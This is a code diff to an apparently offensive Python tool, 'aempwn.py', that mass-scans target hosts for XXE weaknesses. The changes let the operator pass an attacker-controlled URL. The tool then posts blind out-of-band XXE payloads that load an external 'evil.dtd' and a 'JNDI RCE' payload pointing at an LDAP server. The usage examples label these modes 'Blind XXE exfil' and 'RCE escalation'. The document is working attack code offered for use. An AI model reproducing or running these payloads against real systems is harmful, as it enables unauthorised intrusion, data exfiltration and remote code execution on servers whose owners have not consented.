@@ -46,14 +46,6 @@ XXE_PROBES = {
 }
 
 
-XXE_OOB = """<?xml version="1.0"?>
-<!DOCTYPE t [ <!ENTITY % r SYSTEM "http://YOUR_SERVER/evil.dtd"> %r; ]>
-<request><probe>ok</probe></request>"""
-
-XXE_RCE = """<?xml version="1.0"?>
-<!DOCTYPE t [ <!ENTITY % r SYSTEM "http://YOUR_SERVER/rce.dtd"> %r; ]>
-<request><probe>ok</probe></request>"""
-
 def banner():
     print(RED + r"""
  █████╗ ███████╗███╗   ███╗██████╗ ██╗    ██╗███╗   ██╗
@@ -134,7 +126,7 @@ def write_hit(out, base, items):
             f.write(f" {i}\n")
         f.write("\n")
 
-def scan_target(target, oob, rce, verbose):
+def scan_target(target, oob_url, rce_ldap, verbose):
     base = normalize(target)
     hits = []
     score = 0
@@ -157,18 +149,35 @@ def scan_target(target, oob, rce, verbose):
                     score += 3
             except:
                 pass
+        
+        if oob_url:
+            try:
+                post(url, f"""<?xml version="1.0"?>
+<!DOCTYPE t [ <!ENTITY % remote SYSTEM "{oob_url}/evil.dtd"> %remote; ]>
+<request><probe>ok</probe></request>""")
+            except:
+                pass
+
+        if rce_ldap:
+            try:
+                post(url, f"""<?xml version="1.0"?>
+<!DOCTYPE t [ <!ENTITY % remote SYSTEM "{rce_ldap}"> %remote; ]>
+<request><probe>ok</probe></request>""")
+            except:
+                pass
+
 
     if not surface and score == 0:
         if verbose:
             print(f"{GREEN}[-] {base} no signals{RESET}")
         return False, base, []
 
-    if oob:
-        hits.append("OOB XXE payload sent (check collaborator logs)")
+    if oob_url:
+        hits.append(f"OOB XXE payload sent → {oob_url}/evil.dtd (check listener)")
         score += 2
 
-    if rce:
-        hits.append("JNDI RCE payload sent (check LDAP listener)")
+    if rce_ldap:
+        hits.append(f"JNDI RCE payload sent → {rce_ldap} (check LDAP listener)")
         score += 5
 
     print(f"{BOLD}{RED}[+] {base} VULNERABLE score={score}{RESET}")
@@ -177,14 +186,14 @@ def scan_target(target, oob, rce, verbose):
 
     return True, base, hits
 
-def scan_file(path, threads, oob, rce, verbose, out):
+def scan_file(path, threads, oob_url, rce_ldap, verbose, out):
     with open(path) as f:
         targets = [l.strip() for l in f if l.strip()]
 
     print(f"[*] Loaded {len(targets)} targets | threads={threads}\n")
 
     with ThreadPoolExecutor(max_workers=threads) as ex:
-        futures = [ex.submit(scan_target, t, oob, rce, verbose) for t in targets]
+        futures = [ex.submit(scan_target, t, oob_url, rce_ldap, verbose) for t in targets]
         for fut in as_completed(futures):
             ok, base, hits = fut.result()
             if ok:
@@ -205,10 +214,10 @@ Examples:
     python aempwn.py -f hosts.txt -t 20
 
   Blind XXE exfil:
-    python aempwn.py -f hosts.txt --oob
+    python aempwn.py -f hosts.txt --oob http://abc.oastify.com
 
   RCE escalation (JNDI):
-    python aempwn.py -u target.com --rce
+    python aempwn.py -u target.com --rce ldap://1.2.3.4:1389/#Exploit
 
 Notes:
   --oob requires hosting evil.dtd
@@ -219,8 +228,8 @@ Notes:
     parser.add_argument("-u", "--url", help="Single target (domain or full URL)")
     parser.add_argument("-f", "--file", help="File with targets (one per line)")
     parser.add_argument("-t", "--threads", type=int, default=10, help="Thread count (default 10)")
-    parser.add_argument("--oob", action="store_true", help="Blind XXE exfil mode")
-    parser.add_argument("--rce", action="store_true", help="RCE JNDI escalation mode")
+    parser.add_argument("--oob", type=str, help="OOB XXE mode — base URL hosting evil.dtd (ex: http://your.oastify.com)")
+    parser.add_argument("--rce", type=str, help="RCE JNDI mode — LDAP URL (ex: ldap://server:1389/#Exploit)")
     parser.add_argument("-v", "--verbose", action="store_true", help="Verbose output")
     parser.add_argument("-o", "--out", default=DEFAULT_OUT, help=f"Output file (default: {DEFAULT_OUT})")
 
@@ -230,14 +239,25 @@ Notes:
         print(f"{RED}[-] Use either --oob or --rce, not both{RESET}")
         sys.exit(1)
 
+    oob_url = args.oob
+    rce_ldap = args.rce
+
+    if args.oob and not oob_url:
+        print(f"{RED}[-] --oob requires a URL{RESET}")
+        sys.exit(1)
+
+    if args.rce and not rce_ldap:
+        print(f"{RED}[-] --rce requires an LDAP URL{RESET}")
+        sys.exit(1)
+
     if args.url:
-        ok, base, hits = scan_target(args.url, args.oob, args.rce, args.verbose)
+        ok, base, hits = scan_target(args.url, oob_url, rce_ldap, args.verbose)
         if ok:
             write_hit(args.out, base, hits)
         return
 
     if args.file:
-        scan_file(args.file, args.threads, args.oob, args.rce, args.verbose, args.out)
+        scan_file(args.file, args.threads, oob_url, rce_ldap, args.verbose, args.out)
         return
 
     parser.print_help()
